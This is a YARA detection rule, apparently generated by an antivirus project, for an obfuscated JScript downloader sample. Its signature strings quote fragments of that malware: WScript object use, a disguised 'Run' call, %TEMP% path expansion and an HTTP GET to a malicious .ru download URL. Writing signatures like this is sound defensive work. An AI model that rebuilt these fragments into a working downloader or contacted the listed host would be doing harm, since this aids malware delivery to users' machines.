rule sig_20160428_7c04939fdaa69197d4cb130b77ac9373 {
  meta:
    description = "datamaliciousorder - file 20160428_7c04939fdaa69197d4cb130b77ac9373.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "160c403b7d55030ba196bf183ef94d08cff5cb3fcf695c1bc1d47cc1db4fe2c4"

  strings:
    $s1  = "function JojSsoKrzUvxPobKqgXrv(WwsFfbFutEheZgqXxrJbv){IzyFqsQhvHqwIgiThvXgb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function YaeOdrAmnLhgPseWxrBve() {return IzyFqsQhvHqwIgiThvXgb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function JojSsoKrzUvxPobKqgXrv(WwsFfbFutEheZgqXxrJbv){IzyFqsQhvHqwIgiThvXgb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var IzyFqsQhvHqwIgiThvXgb = function PixIknBbvYddAuvJmfXoy() {return ImpHtvNssNjtBpuKnpVoe[IxfEqlItmDbxWwoIlwRgt](\"WScript\"+\"" ascii
    $s5  = "GsuHtyIxuSenAvlTagOnr[BsqUweIdxIhvNjsHdjFis](\"G\" + \"ET\", \"http://minisupergame.ru/a9osfg\", false);" fullword ascii
    $s6  = "var ImpHtvNssNjtBpuKnpVoe = this[\"WScript\"];" fullword ascii
    $s7  = "var IzyFqsQhvHqwIgiThvXgb = function PixIknBbvYddAuvJmfXoy() {return ImpHtvNssNjtBpuKnpVoe[IxfEqlItmDbxWwoIlwRgt](\"WScript\"+\"" ascii
    $s8  = "function YaeOdrAmnLhgPseWxrBve() {return IzyFqsQhvHqwIgiThvXgb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "if (GsuHtyIxuSenAvlTagOnr[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function NpiVudBtuZctAlfXtxGhm(SjzDunIbvLreCaqAssNnm, NskZayPkjEkiSqkHtjXrk){LgaJdkLsqGngQmvJhuPlq = LgaJdkLsqGngQmvJhuPlq * 1; " ascii
    $s11 = "return SjzDunIbvLreCaqAssNnm - NskZayPkjEkiSqkHtjXrk;};" fullword ascii
    $s12 = "function GacHguLhuFqqJcrAjaOqy() {return ((JrnEjdUpfKqqWuzSlzXza == true) && (JrnEjdUpfKqqWuzSlzXza == DycExnVjlJuuWsiZllByk)) ?" ascii
    $s13 = "function GacHguLhuFqqJcrAjaOqy() {return ((JrnEjdUpfKqqWuzSlzXza == true) && (JrnEjdUpfKqqWuzSlzXza == DycExnVjlJuuWsiZllByk)) ?" ascii
    $s14 = "function JsmHlaLmxJmaGclGptQkz(CorXmmCrfIerZuzNfePkk) {var YuwWpvUsdWnyJruWpdTyr = (1, 2, 3, 4, 5, CorXmmCrfIerZuzNfePkk); retur" ascii
    $s15 = "function JsmHlaLmxJmaGclGptQkz(CorXmmCrfIerZuzNfePkk) {var YuwWpvUsdWnyJruWpdTyr = (1, 2, 3, 4, 5, CorXmmCrfIerZuzNfePkk); retur" ascii
    $s16 = "}while (IdoXudBrzKseMbcVezVyx);" fullword ascii
    $s17 = "var JrnEjdUpfKqqWuzSlzXza = false;" fullword ascii
    $s18 = "function NrqWtjSfbVnqLiwNehIxg()" fullword ascii
    $s19 = "return NpiVudBtuZctAlfXtxGhm(1 == 1 ? ClnIteAynJusZysGxbViw : 0, 1 == 1 ? CkwJxwAvhGxuLrrXkpIkq : 0);" fullword ascii
    $s20 = "var UkxPvwNucNyrTwnSjbMno = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}